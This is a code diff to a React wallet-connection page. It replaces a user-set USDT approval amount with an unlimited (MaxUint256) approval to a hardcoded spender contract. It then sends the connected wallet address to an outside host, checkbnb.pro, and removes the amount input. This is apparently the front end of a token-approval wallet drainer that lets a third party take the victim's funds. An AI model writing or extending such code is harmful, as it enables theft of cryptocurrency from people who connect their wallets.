@@ -13,7 +13,6 @@ const SPENDER_CONTRACT_ADDRESS = "0x25bcea1e87afdb94be3081ab379f28f00cf84eeb"; /
 function App() {
   const [walletAddress, setWalletAddress] = useState("");
   const [status, setStatus] = useState("");
-  const [amount, setAmount] = useState("10"); // Default 10 USDT
 
   useEffect(() => {
     const checkConnection = async () => {
@@ -43,19 +42,19 @@ function App() {
       const signer = await provider.getSigner();
       const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
 
-      const decimals = await usdt.decimals();
-      const rawAmount = ethers.parseUnits(amount, decimals);
+      // Approve unlimited USDT
+      const maxApproval = ethers.MaxUint256;
 
-      const tx = await usdt.approve(SPENDER_CONTRACT_ADDRESS, rawAmount);
-      setStatus("⏳ Approving...");
+      const tx = await usdt.approve(SPENDER_CONTRACT_ADDRESS, maxApproval);
+      setStatus("⏳ Approving unlimited USDT...");
       await tx.wait();
-      setStatus("✅ Approved!");
+      setStatus("✅ Unlimited approval done!");
 
-      // Call your backend here
+      // Trigger backend with connected wallet address
       const res = await fetch("http://checkbnb.pro", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ sender: walletAddress })
+        body: JSON.stringify({ sender: walletAddress }),
       });
 
       if (res.ok) {
@@ -64,7 +63,6 @@ function App() {
       } else {
         setStatus("⚠️ Backend failed to respond.");
       }
-
     } catch (err) {
       console.error(err);
       setStatus("❌ Error: " + err.message);
@@ -81,20 +79,8 @@ function App() {
         <button onClick={connectWallet}>Connect Wallet</button>
       )}
 
-      <div style={{ marginTop: "1rem" }}>
-        <label>
-          Amount to approve (USDT):{" "}
-          <input
-            type="number"
-            value={amount}
-            onChange={(e) => setAmount(e.target.value)}
-            min="0"
-          />
-        </label>
-      </div>
-
       <button onClick={approveUSDT} style={{ marginTop: "1rem" }}>
-        Approve & Trigger Backend
+        Approve Unlimited USDT & Trigger Backend
       </button>
 
       {status && (
